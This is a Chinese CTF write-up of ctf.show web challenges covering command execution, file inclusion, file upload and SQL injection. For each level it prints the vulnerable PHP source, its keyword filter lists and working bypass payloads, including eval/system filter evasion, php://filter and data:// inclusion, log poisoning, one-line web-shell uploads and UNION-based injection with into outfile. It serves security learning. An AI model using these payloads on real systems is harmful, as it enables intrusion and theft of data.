# Web入门

**Web方向主打的就是一个经验积累。**

## 命令执行

**贴出的源代码均已去掉注释，太影响排版了**

### web29

命令执行，需要严格的过滤

贴上网站源代码

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

原理分析：获得一个名为”c“的GET请求，若这个请求中没有”flag“字样，则将这个GET请求当作一段PHP命令直接执行。

首先考虑扫一下目录，发现了一个flag.php可以直接访问，然而网站的过滤不允许。

先构建?c=phpinfo();调出了php介绍页面，发现PHP版本为7.3.11。同时服务器使用的是linux系统。这里没有找到flag。

先考虑使用system函数实现命令的执行，构造?c=system("ls");作为测试，发现成功了，网站给出可执行的文件分别为index.php和flag.php，其中默认显示的为index.php。

对于flag.php的访问，可以考虑使用f*，或者在linux系统下插入’‘，”“，\ ("\ "可能会被浏览器强行改为/，小心)来实现绕过。

接下来尝试使用?c=echo `tac f""lag.php`;成功得到flag

参考payload:?c=echo `tac f""lag.php`;

#### web29更好的解法

如果选择将flag.php内容先复制到另一个文件里，然后再直接访问这个文件，可以得到一个排版更好的内容。

参考payload:?c=echo `cp f* 1.txt`;然后直接访问1.txt即可。





### web30

命令执行，需要严格的过滤

本次flag、system和php被过滤了。

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

说明执行系统命令得使用其他的替代品，比如说echo ``，passthru等。

以**web29更好的解法**同样的原理，构造?c=echo `cp f* 1.txt`;然后直接访问1.txt即可得到flag

或者说，也可以?c=echo `tac f""lag.p""hp`;

不上图了，跟web29差不多。



### web31

这一次增加了cat,sort,shell,'.'和空格的过滤

**空格可以用tab代替，输入其URL编码%09，'.'同理**

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```

payload：?c=echo%09`tac%09f*`;

直接出答案，或者**复制后再访问**的思路也可以，但攻防的时候这样干确定不会被蓝队抓个正着吗？

同时如果复制的文件不写扩展名，需要下载下来用记事本查看。



### web32

很好，这次额外禁用了echo，内联和分号还有引号。看来**传统的命令执行是不行了**。

目前各位师傅的wp里面写的是文件包含，但用这个方法的话我要下一个专题有何用？

因此这里有一位师傅给出了回答：等后来学会了文件包含再来做这个。

payload：?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

这样可以利用伪协议得到flag.php的base64编码，前面的部分先闭合了上一个函数进行**逃逸**并将舞台留给伪协议。

```
<?php

error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web33

这次双引号被过滤了，还是得逃逸外加文件包含。

payload:?c=include%09$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php

payload:?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web34

放上源码

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

需要一个名称为“c”的GET请求，通过正则匹配的判断后即可执行命令

目前可用的执行函数有：passthru()

目前可用的读取函数有：tac, more, less, tail

空格和分号均被过滤了。

尝试逃逸加文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

成功，拿到flag。



### web35

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

同web34进行逃逸和文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



### web36

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

他这次把数字给禁用了

?c=include%09$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php



### web37

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

文件包含，由于过滤了flag，不能用php协议，所以用data://text/plain解决，绕开过滤用正则

?c=data://text/plain,<?php system("tac f*");?>

得到flag



### web38

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

增加了对php的过滤，然而没什么用

?c=data://text/plain,<?=system("tac f*");?>



### web39

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

收到一个名为c的GET请求，然后如果里面没有flag，那就给它后面加个.php包含它,其实如果结尾闭合了可以不管这个尾巴。

payload:

?c=data://text/plain,<?=system("tac%20f*");?>



### web40

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

搁这全武行呢？过滤了数字，~，`，@，#，$，%，^，&，*，()，-，=，+，{}，[]……

个人评价是：?c=echo%20highlight_file(next(array_reverse(scandir(pos(localeconv())))));

什么嘛，那是中文括号，吓我一跳。



### web41

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

POST请求，上bp

本题给出了一个脚本，可用于从ASCII中从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。

用那个脚本即可得到结果，与此同时，如果以后还有**没有过滤或运算**的命令执行时，均可以用它来生成可执行结果并跑出结果。

![](.\命令执行\web41.png)

脚本已同步于Github的script仓库中。



### web42

> 关于shell的重定向命令
>
> 标准输入，值为0，从磁盘获得输入
>
> 标准输出，值为1，输出到屏幕
>
> 错误输出，值为2，输出到屏幕
>
> 对应着/proc/self/fd/**x**，**x**为上面对应的值

现在看题，重点在于> /dev/null 2>&1

/dev/null为linux系统回收站，数据会被直接丢弃

2>&1则是将错误输出重定向到标准输出，如此一来便不会回显到显示器上。

所以采用命令把flag打印出来，利用；分隔分化一下命令，如此便能使其回显出来。

本题中输入?c=ls;ls，显示文件目录

?c=tac flag.php;ls，拿到flag



### web43

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次不许有分号，也不许有cat。tac不受影响，分号的分化分割作用可以用||代替。

payload:?c=tac flag.php ||



### web44

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

新增对flag的过滤，那就先正则匹配

payload:?c=tac f* ||



### web45

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次加了一个空格。空格可以用url编码的TAB代替，即%09

payload:?c=tac%09f*||



### web46

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次增加了对数字,$和*的过滤。

payload:?c=tac%09fla''g.php||



### web47

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

啊这……tac无所畏惧

payload:?c=tac%09fl''ag.php||



### web48

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

小老弟你怎么回事？

payload:?c=tac%09fl''ag.php||



### web49

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:?c=tac%09fl''ag.php||

这tac是犯了天条吗？几乎没见着过滤它的。



### web50

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次原先的payload终于没用了，好耶！

然后发现tac依旧坚挺，倒下的是%09，尝试使用%0C取代，不行，换<试试？行了

payload:?c=tac<fla''g.php||



### web51

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

无敌的tac倒下了，但是<没有倒下，||也没有倒下！

payload:?c=nl<fl''ag.php||

成功自行构造出官解，然而记得看源代码，这题没有回显。



### web52

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次<被过滤了。

        cat${IFS}flag.txt
        cat$IFS$9flag.txt
        cat<flag.txt
        cat<>flag.txt
        ca\t fl\ag
        kg=$ '\x20flag.txt' &&cat$kg
        (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
来来来，百科全书，上

payload：?c=nl$IFS/fl%27%27ag||

为什么不要php，没搞懂。



### web53

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

<br>空标签，意味着换行。也就是说会出现原指令的名字。

?c=ls查看发现有flag.php和readflag？

都尝试打开试试

?c=t''ac${IFS}fla''g.p''hp



### web54

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了很多命令。中间这些个很多的星号的内容，其实是说，含有cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。只能把全路径写出来，如/bin/ca?,与/bin/ca?匹配的，只有/bin/cat命令，这样就用到了cat 命令了。

空格依旧用${IFS}代替。先ls查看一下，发现目标文件flag.php

然后构建查看flag.php的payload：?c=/bin/?at${IFS}f???????

请注意，它只是执行了但没有回显结果，需要自己看源代码



### web55

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。

但因为字母不能传入，我们需要使用通配符?来进行代替

?c=/bin/base64 flag.php

替换后变成

?c=/???/????64 ????.???

谜语人滚出CTF！

还真的得到了base64编码，但这种纯靠猜的题目建议扔秦岭喂大熊猫



### web56(未完成)

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

它这次把数字也过滤了……



## 文件包含

文件包含系列开始

### web78

网站源码为：

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

没有任何的过滤

可见对于一个名为“file”的GET请求，会以include的形式去执行，那这个地方尝试使用php伪协议

payload：?file=php://filter/convert.base64-encode/resource=flag.php

再一次获得flag.php的base64编码

解码即可得到flag



### web79

这一次出现了过滤，会将php自动转换为 ???从而使php伪协议失效

换别的协议吧，比如说data://,file://。

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

构造payload:?file=data://text/plain,<?=system('tac flag*');?>

原理：利用data协议直接让其执行命令。



### web80

这一次的过滤有php和data，那就只能用别的伪协议了，压缩的那几个肯定不用了。那只剩一个file了。

但是**file只能够读取本地文件**，我要它有何用啊？

说明这里根本就不是绕过关键词，而是绕过过滤。

思路，更改大小写来绕过。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP://input,然后需要构建POST请求。此处使用到BurpSuite，

构建<?php system("ls");?>输入即可得到文件遍历目录。

这个网站里面有fl0g.php index.php两个文件，当然我们不能直接访问得到。

那就再来一次。

payload:?file=PHP://input，POST：<? php system("tac f*");?>

这次得到了flag



### web81

吊毛，这次把冒号过滤掉了，那就用url编码%3A代替。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  $file = str_replace(":", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP%3A//input,POST:<?php system("ls");?>

然后冒号被过滤了……说明php://input失效了

但还有日志可以用，?file=/var/log/nginx/access.log，发现它读取了很多的UA

那就在UA里面做手脚。抓包，UA插一句话木马，然后对着这个文件用AntSword，刀它！

在/var/www/html/fl0g.php中发现了flag

![](.\文件包含\图片\web81.png)



### web82

文件包含

**竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**

嗯？竞争环境？

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

好吧，php和data被锁了，冒号和点号被封了。这下后门都上不了了。

根据题目提示，使用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含。

然而这题得熬夜做……今天就算了。







## php特性



## 文件上传

### web151

前台校验不可靠

那就改前端，按F12打开控制台。找到前端检查文件格式的地方，发现可以更改例外情况，那就把png改为php，上传一句话木马，然后AntSword连接即可。

![前端弱点](.\文件上传\web151\找到前端弱点.png)

在/var/www/html中找到flag.php，打开它得到flag。

![发现flag](.\文件上传\web151\得到flag.png)



### web152

后端不能单一校验

开局和web151一样的操作，先改前端使其能够上传php文件，然后发现它拒绝了，看来文件类型被人发现不对头了。

加个头试试？还是不合规。

那改变文件类型试试？想多了，文件类型改了就失效了。

看来必须得上传一个图片。

使用bp抓包，先将一句话木马改为png格式成功上传，抓包成功后然后修改回php的后缀解析在放包。

AntSword连接，成功

在/var/www/html里面找到了藏有flag的flag.php文件

![web152](.\文件上传\web152.png)



### web153（未完成）





## SQL注入

> 手动注入基本步骤：所有语句末尾接%23
>
> 1. 查询闭合条件:  空格/单引号/两个单引号…… ，测试到再度正常为止
> 2. 测试字段数：闭合 order by，查到异常到再度正常为止
> 3. 查回显字段：闭合 union select 所有段 查看结果
> 4. 爆库名：回显字段替换为database()
> 5. 爆表名：回显字段替换为group_concat(schema_name)，末尾接上from information_schema.schemata
> 6. 爆字段：回显字段替换为group_concat(table_name)，末尾接上from information_schema.tables where table_schema=database()
> 7. 爆对应字段的所有列的值：回显字段替换为group_concat(column_name),末尾接上 from information_schema.columns where table_name='字段名'
> 8. 爆对应列的对应值：回显字段替换为group_concat(所有想要的列)，末尾接上from 对应字段
>
> 

### web171

使用sqlmap是没有灵魂的，你在内涵谁？

等会儿就去Github上学习sqlmap的源代码，学会了再用这个，就有灵魂了（乐）。

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

入门的sql注入 这道题目其实就是最简单的sql注入的例子，这里会把输入的id以get的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测username为为flag的用户他的信息就是我们所需要的。

但是网页里所展示的24个用户并没有我们所需要的flag

这里主要的思路就是**用or进行截断，然后or后面跟我们所需要查询的语句**

'我们传入的语句'

首先我们给前面一个查询语句一个不可能达成的条件去截断它，即**-1'**

然后用or加上我们所要查询的 or username = 'flag'.我们语句外面还有一个引号。所以我们不要最后一个引号

最后的语句就是这样 -1' or username = 'flag

![](.\SQL注入\web171.png)

尝试使用sqlmap解决此题：

```
sqlmap -u "http://cde6efe9-40f8-430c-9698-5cdac62609b6.challenge.ctf.show/?id=1" --dbs --batch
```

想多了，别人把GET请求隔离了，专门放CSRF攻击的。



### web172

撸猫为主，要什么flag？

我就要！

进入环境，查看页面源码，发现select.js

看到查询时的url是/api/?id=

![](.\SQL注入\web172\完成注入.png)

先上手动注入流程：

1. 查看页面源码，发现select.js

   看到查询时的url是/api/?id=

   /api/?id=1' order by 3%23

   /api/?id=1' union select 1,2,3%23

   /api/?id=1' union select 1,2,database()%23

   联合查询

   /api/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

   /api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23

   /api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23

   看到有3列 id,username,password

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

   查询password发现没有flag

   查另一个表 ctfshow_user2

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

   看到flag

   ![](.\SQL注入\web172\完成注入.png)



### web173

考查sql基础

api/?id= 还是一如既往，开始手动注入

1. 闭合为1’
2. order by 检查有3段
3. 三段均可显示，nice
4. 数据库名：ctfshow_web
5. 表名：information_schema,test,mysql,performance_schema,ctfshow_web
6. ctfshow_web列名：ctfshow_user,ctfshow_user2,ctfshow_user3
7. ctfshow_user行名：没有
8. ctfshow_user2行名：没有
9. ctfshow_user3行名：id,username,password
10. ?id=1' union select id,username,password from ctfshow_user3%23，得到ctfshow{48d10635-f753-4e3a-bd14-b11b924dc67c}

![](.\SQL注入\web173.png)

### web174

本题过滤了一切带有数字的值回显出来，那就只能使用replace()语法将数字全部转换成字母来进行注入了

```
0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),"1","@A"),"2","@B"),"3","@C"),"4","@D"),"5","@E"),"6","@F"),"7","@G"),"8","@H"),"9","@I"),"0","@J") from ctfshow_user4 where username="flag" --+
```

但是，这样子会让flag也变成加密形式，因此需要写脚本还原

```
import base64

flag64 = "Y@CRmc@Bhvd@Cs@JYzcxYjRjYy@AmMjZkLTQ@BYjctYmU@JZS@AjYTMwMmFjZWU@EODZ@I"
flag = flag64.replace("@A", "1").replace("@B", "2").replace("@C", "3").replace("@D", "4").replace("@E", "5").replace(
    "@F", "6").replace("@G", "7").replace("@H", "8").replace("@I", "9").replace("@J", "0")

print(base64.b64decode(flag))
```

最后解码得到flag的值

![](.\SQL注入\web174\web174.png)



### web175

虽然正则匹配过滤了所有ASCII值的回显，但这并不意味着注入点不能看，毕竟无显示和异常还是有区别的。

然后关于不回显的事情，将内容输出到别的文件里访问就是了。

1. 测试发现1‘ 即可闭合代码
2. 经过order by测试，这次的数据库只有两段
3. 这都不需要测试回显了，就两行，图中有三行，怎么都显示。
4. 由于不回显，我们只能将其输出到另外的文件中查看，构造payload:1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'%23，也就是将查询的结果输出到/var/www/html/1.txt的文件中，待会儿我们访问便是。

这不就找到了吗？

![](.\SQL注入\web175.png)

### web176

从现在开始，有字符过滤了，开始学习绕过姿势。

过滤了`select`，通过大小写即可绕过 。order by检查有3行，那就开始吧。

直接构造payload:1' union SELect 1,2,3%23，很好三段均回显。

根据题目所给提示，直接

```
1' union sElect id,username,password from ctfshow_user%23
```

拿到flag

![](.\SQL注入\web176.png)

另解：万能密码'1 or 1=1%23



### web177

这次过滤了空格，/**/或者%09绕过即可。

order by试探了下只有三行，继续union select。

很好，这次没有过滤select。

那就直接把1，2，3换成id,username,password，最后接上%09from%09ctfshow_user%23

成功拿到flag。

![](.\SQL注入\web177.png)

p.s:尝试1‘%9or%091=1%23，失败……



### web178

过滤了空格和*号。

用%09绕过即可

```
1'%09union%09select%09id,username,password%09from%09ctfshow_user%23
```

完事，得到flag

再试试这个也可以

```
id=1'or'1'='1'%23
```

![](.\SQL注入\web178.png)

### web179

它这次把%09绕过了，那就用%0c代替

```
1'%0cunion%0cselect%0cid,username,password%0cfrom%0cctfshow_user%23
```

后面基本过程相似，就不放图了。

万能密码'or'1'='1'%23依旧坚挺，下道题试试看。

### web180

这次过滤了%09,%0a,%0b,%0d，用%0c绕过

通过测试发现注释符被过滤了，即–+，#，%23都不可以使用，我们换一种思路，把sql后面的‘闭合。

```
'or'1'='1'--%0c
```

或者

```
-1'%0cor%0cusername%0clike%0c'flag
```



### web181

```
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

这次过滤了空格

payload:-1'%0cor%0cusername='flag



### web182

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
```

不许直接访问flag

payload:-1'%0cor%0cusername%0clike%0c'f%%%



### web183

```
  function waf($str){
